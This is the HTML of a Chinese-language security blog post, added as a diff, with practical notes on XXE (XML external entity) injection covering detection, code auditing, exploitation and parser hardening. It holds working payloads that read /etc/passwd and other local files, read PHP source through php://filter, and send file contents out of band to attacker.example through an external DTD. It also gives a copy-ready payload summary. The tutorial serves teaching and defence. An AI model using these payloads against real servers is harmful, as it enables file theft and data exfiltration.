@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XML 与 XXE（外部实体注入）检测、利用与防护——实战笔记</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@XML 与 XXE（外部实体注入）检测、利用与防护——实战笔记 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/xxe/xxe1/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="XML 与 XXE（外部实体注入）检测、利用与防护——实战笔记" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/xxe/xxe1/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-04-26T15:00:00+09:00" />
+<meta property="article:modified_time" content="2024-04-26T15:00:00+09:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="XML 与 XXE（外部实体注入）检测、利用与防护——实战笔记"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "XXE漏洞",
+      "item": "http://118.178.86.67/list/base_bug/xxe/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "XML 与 XXE（外部实体注入）检测、利用与防护——实战笔记",
+      "item": "http://118.178.86.67/list/base_bug/xxe/xxe1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XML 与 XXE（外部实体注入）检测、利用与防护——实战笔记",
+  "name": "XML 与 XXE（外部实体注入）检测、利用与防护——实战笔记",
+  "description": "",
+  "keywords": [
+    "XXE", "XML", "外部实体", "带外", "无回显", "检测", "防护"
+  ],
+  "articleBody": "概述 XML（eXtensible Markup Language）用于传输与存储结构化数据，关注数据本身的语义，与用于显示的 HTML 不同。XXE（XML External Entity Injection）是指在应用解析不安全的 XML 输入时，允许外部实体（external entity）被解析，从而导致本地文件读取、敏感信息泄露、带外（out-of-band）回显、服务器端请求伪造（SSRF）、内网扫描甚至命令执行等严重后果。\n说明：以下示例和 payload 均为教学用途，请仅在授权环境或靶场演练，不要用于未授权目标。\nXML 与 HTML 的主要差异 XML 关注数据的结构与交换，适合作为 API、配置、数据持久化的载体。 HTML 关注数据的展示与浏览器渲染。 XXE 漏洞的成因 当应用使用不安全或默认开启外部实体解析的 XML 解析器（如某些配置的 libxml、Java DOM/SAX、PHP 的旧版本扩展等），并且未对输入来源进行严格限制或禁用外部实体解析，就会出现 XXE。\n黑盒测试（外部探测） 思路 发现目标接受 XML，或请求头/响应提示 Content-Type: application/xml、text/xml、application/soap+xml 等。 即便目标当前不是 XML 类型，也可尝试修改 Content-Type 或提交带 XML 结构的 body 进行测试。 在文件上传、预览、第三方插件解析处也可能触发 XXE（例如：上传 XML/配置文件并被服务端解析）。 常用初始探针（快速探测） \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY f SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u0026f; 如果返回中包含 /etc/passwd 的内容即说明存在直接回显型 XXE。\n白盒审计（源码/函数层面） 审计流程建议：\n搜索常见易受影响的解析函数，例如 simplexml_load_string、DOMDocument-\u003eloadXML、SAXParser.parse 等。 追溯调用链（例如某些框架函数封装了解析逻辑），定位输入入口是否可控。 检查解析器配置（是否禁用了实体、是否禁用了外部DTD、是否设置了安全选项）。 查找对 php://、file://、expect://、jar:、http:// 等协议的处理或过滤逻辑。 示例：在 PHP 中查找 simplexml_load_string 并追踪其调用路径（如：pe_getxml → wechat_getxml → notify_url），可快速定位可触发点。\n利用与示例（payload） 以下 payload 展示了几类常见利用方式：直接回显、带外回显（DNSLog/HTTP 回连）、外部 DTD 引用、php://filter 读取并 base64 编码等。\n1. 读取本地文件（直接回显） \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE xiaodi [ \u003c!ENTITY test SYSTEM \"file:///d:/1.txt\"\u003e ]\u003e \u0026test; xiaodi 2. 读取并 base64 编码 PHP 文件（绕过无回显） php://filter/read=convert.base64-encode/resource=msg.php 将其放入实体即可把文件以 base64 形式输出，便于无二进制回显时获取内容。\n3. 带外（OOB）探测 —— DNS/HTTP 回连 \u003c?xml version=\"1.0\" ?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY % file SYSTEM \"http://your-dnslog-server.example\"\u003e %file; ]\u003e \u0026send; 或使用外部 DTD：\n\u003c?xml version=\"1.0\" ?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY % file SYSTEM \"http://127.0.0.1:8081/xiaodi.dtd\"\u003e %file; ]\u003e \u0026send; 外部 DTD（xiaodi.dtd）可以包含读取本地文件并将其发送到你的监听服务器的实体：\ntest.dtd 示例：\n\u003c!ENTITY send SYSTEM \"file:///d:/1.txt\"\u003e 或者更复杂的无回显带外实现见下。\n4. 无回显读取 + 带外回连（常用写法） 当目标不将实体插入响应时，可通过外部 DTD 的二次解析和 HTTP 回连实现泄露：\n主请求：\n\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE updateProfile [ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/path/to/secret\"\u003e \u003c!ENTITY % dtd SYSTEM \"http://attacker.example/hzh.dtd\"\u003e %dtd; %send; ]\u003e hzh.dtd（攻击者服务器上的 DTD）：\n\u003c!ENTITY % all \"\u003c!ENTITY % send SYSTEM 'http://attacker.example/get.php?file=%file;'\u003e\"\u003e %all; 服务器会在解析外部 DTD 时向 attacker.example 发起请求，携带被读取的文件内容（有时需对 base64 中的空格/换行做进一步处理）。接收端可写脚本或使用 netcat（注意换行/端口参数）监听。\n常见绕过与伪协议 使用 php://filter 读取并编码文件，绕过部分字符过滤与二进制问题。 使用 expect://（若启用）或 jar: 等协议进行更复杂的本地/远程交互。 嵌套实体（% 引用）常用于在 DTD 内构建多步回连链路。 修复与防护建议 禁用外部实体解析（首选） PHP\nlibxml_disable_entity_loader(true); Java\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); // 进一步设置：dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); Python（lxml）\nfrom lxml import etree parser = etree.XMLParser(resolve_entities=False) etree.parse(xmlSource, parser) 过滤/拒绝不必要的 DTD 与实体声明 在输入层面拒绝包含 \u003c!DOCTYPE、\u003c!ENTITY、SYSTEM、PUBLIC 等关键字的 XML，或对这些关键字进行白名单化处理（慎用简单字符串过滤，易被编码/转义绕过）。\n使用安全的解析库/配置 在 Java 中启用 XMLConstants.FEATURE_SECURE_PROCESSING，禁用外部实体与外部 DTD。 在 PHP 中使用 SimpleXML/DOM 时配置 libxml 选项或使用 XMLReader 并禁用实体。 最小化解析权限 运行解析操作的进程应使用最小权限帐户，避免读取敏感文件。 测试与检测建议（工具链） 使用授权的 DNSLog/HTTP 回连服务或自行搭建监听脚本（注意对 base64 中的空格与换行做处理）。 在代码审计阶段，关注解析函数与外部输入的交互路径。 在黑盒渗透测试中，尝试修改 Content-Type、替换请求体为 XML，并提交不同类型实体以覆盖回显/无回显场景。 常见 Payload 汇总（便于复制使用） 直接读取 /etc/passwd： \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY [\u003c!ENTITY f SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u0026f; 带外回连（外部 DTD）： \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY % file SYSTEM \"http://attacker.example/evil.dtd\"\u003e %file; ]\u003e \u0026send; php://filter 读取并 base64 编码： \u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/secret.php\"\u003e ]\u003e \u0026xxe; 其他参考与延伸 XXE 与 SSRF 在某些场景重合（例如外部实体触发对内网请求），在应急响应时需要同时考虑两者影响范围。 对于复杂环境（容器、沙箱），要判断解析器是否支持外部实体、是否允许访问宿主文件系统或内置协议。 ",
+  "wordCount" : "331",
+  "inLanguage": "en",
+  "datePublished": "2024-04-26T15:00:00+09:00",
+  "dateModified": "2024-04-26T15:00:00+09:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/xxe/xxe1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>XML 与 XXE（外部实体注入）检测、利用与防护——实战笔记</h1>
+  </header>
+
+  <p>
+  <small>
+    April 26, 2024&nbsp;· 331 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#思路">思路</a></li>
+    <li><a href="#常用初始探针快速探测">常用初始探针（快速探测）</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#1-读取本地文件直接回显">1. 读取本地文件（直接回显）</a></li>
+    <li><a href="#2-读取并-base64-编码-php-文件绕过无回显">2. 读取并 base64 编码 PHP 文件（绕过无回显）</a></li>
+    <li><a href="#3-带外oob探测--dnshttp-回连">3. 带外（OOB）探测 —— DNS/HTTP 回连</a></li>
+    <li><a href="#4-无回显读取--带外回连常用写法">4. 无回显读取 + 带外回连（常用写法）</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h1 id="概述">概述</h1>
+<p>XML（eXtensible Markup Language）用于传输与存储结构化数据，关注数据本身的语义，与用于显示的 HTML 不同。XXE（XML External Entity Injection）是指在应用解析不安全的 XML 输入时，允许外部实体（external entity）被解析，从而导致本地文件读取、敏感信息泄露、带外（out-of-band）回显、服务器端请求伪造（SSRF）、内网扫描甚至命令执行等严重后果。</p>
+<blockquote>
+<p>说明：以下示例和 payload 均为教学用途，请仅在授权环境或靶场演练，不要用于未授权目标。</p>
+</blockquote>
+<h1 id="xml-与-html-的主要差异">XML 与 HTML 的主要差异</h1>
+<ul>
+<li>XML 关注数据的结构与交换，适合作为 API、配置、数据持久化的载体。</li>
+<li>HTML 关注数据的展示与浏览器渲染。</li>
+</ul>
+<h1 id="xxe-漏洞的成因">XXE 漏洞的成因</h1>
+<p>当应用使用不安全或默认开启外部实体解析的 XML 解析器（如某些配置的 libxml、Java DOM/SAX、PHP 的旧版本扩展等），并且未对输入来源进行严格限制或禁用外部实体解析，就会出现 XXE。</p>
+<h1 id="黑盒测试外部探测">黑盒测试（外部探测）</h1>
+<h2 id="思路">思路</h2>
+<ol>
+<li>发现目标接受 XML，或请求头/响应提示 Content-Type: application/xml、text/xml、application/soap+xml 等。</li>
+<li>即便目标当前不是 XML 类型，也可尝试修改 Content-Type 或提交带 XML 结构的 body 进行测试。</li>
+<li>在文件上传、预览、第三方插件解析处也可能触发 XXE（例如：上传 XML/配置文件并被服务端解析）。</li>
+</ol>
+<h2 id="常用初始探针快速探测">常用初始探针（快速探测）</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE ANY [
+</span></span><span style="display:flex;"><span>  &lt;!ENTITY f SYSTEM &#34;file:///etc/passwd&#34;&gt;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span>&lt;x&gt;&amp;f;&lt;/x&gt;
+</span></span></code></pre></div><p>如果返回中包含 <code>/etc/passwd</code> 的内容即说明存在直接回显型 XXE。</p>
+<h1 id="白盒审计源码函数层面">白盒审计（源码/函数层面）</h1>
+<p>审计流程建议：</p>
+<ol>
+<li>搜索常见易受影响的解析函数，例如 <code>simplexml_load_string</code>、<code>DOMDocument-&gt;loadXML</code>、<code>SAXParser.parse</code> 等。</li>
+<li>追溯调用链（例如某些框架函数封装了解析逻辑），定位输入入口是否可控。</li>
+<li>检查解析器配置（是否禁用了实体、是否禁用了外部DTD、是否设置了安全选项）。</li>
+<li>查找对 <code>php://</code>、<code>file://</code>、<code>expect://</code>、<code>jar:</code>、<code>http://</code> 等协议的处理或过滤逻辑。</li>
+</ol>
+<p>示例：在 PHP 中查找 <code>simplexml_load_string</code> 并追踪其调用路径（如：<code>pe_getxml</code> → <code>wechat_getxml</code> → <code>notify_url</code>），可快速定位可触发点。</p>
+<h1 id="利用与示例payload">利用与示例（payload）</h1>
+<p>以下 payload 展示了几类常见利用方式：直接回显、带外回显（DNSLog/HTTP 回连）、外部 DTD 引用、<code>php://filter</code> 读取并 base64 编码等。</p>
+<h2 id="1-读取本地文件直接回显">1. 读取本地文件（直接回显）</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE xiaodi [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ENTITY test SYSTEM &#34;file:///d:/1.txt&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;username&gt;</span>&amp;test;<span style="color:#f92672">&lt;/username&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;password&gt;</span>xiaodi<span style="color:#f92672">&lt;/password&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/user&gt;</span>
+</span></span></code></pre></div><h2 id="2-读取并-base64-编码-php-文件绕过无回显">2. 读取并 base64 编码 PHP 文件（绕过无回显）</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>php://filter/read=convert.base64-encode/resource=msg.php
+</span></span></code></pre></div><p>将其放入实体即可把文件以 base64 形式输出，便于无二进制回显时获取内容。</p>
+<h2 id="3-带外oob探测--dnshttp-回连">3. 带外（OOB）探测 —— DNS/HTTP 回连</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE test [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ENTITY % file SYSTEM &#34;http://your-dnslog-server.example&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>  %file;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user&gt;&lt;username&gt;</span>&amp;send;<span style="color:#f92672">&lt;/username&gt;&lt;/user&gt;</span>
+</span></span></code></pre></div><p>或使用外部 DTD：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE test [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ENTITY % file SYSTEM &#34;http://127.0.0.1:8081/xiaodi.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>  %file;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user&gt;&lt;username&gt;</span>&amp;send;<span style="color:#f92672">&lt;/username&gt;&lt;/user&gt;</span>
+</span></span></code></pre></div><p>外部 DTD（xiaodi.dtd）可以包含读取本地文件并将其发送到你的监听服务器的实体：</p>
+<p>test.dtd 示例：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!ENTITY</span> send <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;file:///d:/1.txt&#34;</span><span style="color:#66d9ef">&gt;</span>
+</span></span></code></pre></div><p>或者更复杂的无回显带外实现见下。</p>
+<h2 id="4-无回显读取--带外回连常用写法">4. 无回显读取 + 带外回连（常用写法）</h2>
+<p>当目标不将实体插入响应时，可通过外部 DTD 的二次解析和 HTTP 回连实现泄露：</p>
+<p>主请求：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE updateProfile [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/path/to/secret&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ENTITY % dtd SYSTEM &#34;http://attacker.example/hzh.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>  %dtd;
+</span></span><span style="display:flex;"><span>  %send;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span></code></pre></div><p>hzh.dtd（攻击者服务器上的 DTD）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!ENTITY</span> % all <span style="color:#e6db74">&#34;&lt;!ENTITY % send SYSTEM &#39;http://attacker.example/get.php?file=%file;&#39;&gt;&#34;</span><span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span>%all;
+</span></span></code></pre></div><p>服务器会在解析外部 DTD 时向 <code>attacker.example</code> 发起请求，携带被读取的文件内容（有时需对 base64 中的空格/换行做进一步处理）。接收端可写脚本或使用 netcat（注意换行/端口参数）监听。</p>
+<h1 id="常见绕过与伪协议">常见绕过与伪协议</h1>
+<ul>
+<li>使用 <code>php://filter</code> 读取并编码文件，绕过部分字符过滤与二进制问题。</li>
+<li>使用 <code>expect://</code>（若启用）或 <code>jar:</code> 等协议进行更复杂的本地/远程交互。</li>
+<li>嵌套实体（<code>%</code> 引用）常用于在 DTD 内构建多步回连链路。</li>
+</ul>
+<h1 id="修复与防护建议">修复与防护建议</h1>
+<ol>
+<li><strong>禁用外部实体解析（首选）</strong></li>
+</ol>
+<p><strong>PHP</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">libxml_disable_entity_loader</span>(<span style="color:#66d9ef">true</span>);
+</span></span></code></pre></div><p><strong>Java</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>DocumentBuilderFactory dbf <span style="color:#f92672">=</span> DocumentBuilderFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setExpandEntityReferences</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 进一步设置：dbf.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);
+</span></span></span></code></pre></div><p><strong>Python（lxml）</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> lxml <span style="color:#f92672">import</span> etree
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>XMLParser(resolve_entities<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>etree<span style="color:#f92672">.</span>parse(xmlSource, parser)
+</span></span></code></pre></div><ol start="2">
+<li><strong>过滤/拒绝不必要的 DTD 与实体声明</strong></li>
+</ol>
+<p>在输入层面拒绝包含 <code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、<code>SYSTEM</code>、<code>PUBLIC</code> 等关键字的 XML，或对这些关键字进行白名单化处理（慎用简单字符串过滤，易被编码/转义绕过）。</p>
+<ol start="3">
+<li><strong>使用安全的解析库/配置</strong></li>
+</ol>
+<ul>
+<li>在 Java 中启用 <code>XMLConstants.FEATURE_SECURE_PROCESSING</code>，禁用外部实体与外部 DTD。</li>
+<li>在 PHP 中使用 <code>SimpleXML</code>/<code>DOM</code> 时配置 libxml 选项或使用 <code>XMLReader</code> 并禁用实体。</li>
+</ul>
+<ol start="4">
+<li><strong>最小化解析权限</strong></li>
+</ol>
+<ul>
+<li>运行解析操作的进程应使用最小权限帐户，避免读取敏感文件。</li>
+</ul>
+<h1 id="测试与检测建议工具链">测试与检测建议（工具链）</h1>
+<ul>
+<li>使用授权的 DNSLog/HTTP 回连服务或自行搭建监听脚本（注意对 base64 中的空格与换行做处理）。</li>
+<li>在代码审计阶段，关注解析函数与外部输入的交互路径。</li>
+<li>在黑盒渗透测试中，尝试修改 <code>Content-Type</code>、替换请求体为 XML，并提交不同类型实体以覆盖回显/无回显场景。</li>
+</ul>
+<h1 id="常见-payload-汇总便于复制使用">常见 Payload 汇总（便于复制使用）</h1>
+<ul>
+<li>直接读取 <code>/etc/passwd</code>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE ANY [&lt;!ENTITY f SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;x&gt;</span>&amp;f;<span style="color:#f92672">&lt;/x&gt;</span>
+</span></span></code></pre></div><ul>
+<li>带外回连（外部 DTD）：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE test [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ENTITY % file SYSTEM &#34;http://attacker.example/evil.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>  %file;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;send;<span style="color:#f92672">&lt;/root&gt;</span>
+</span></span></code></pre></div><ul>
+<li>php://filter 读取并 base64 编码：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
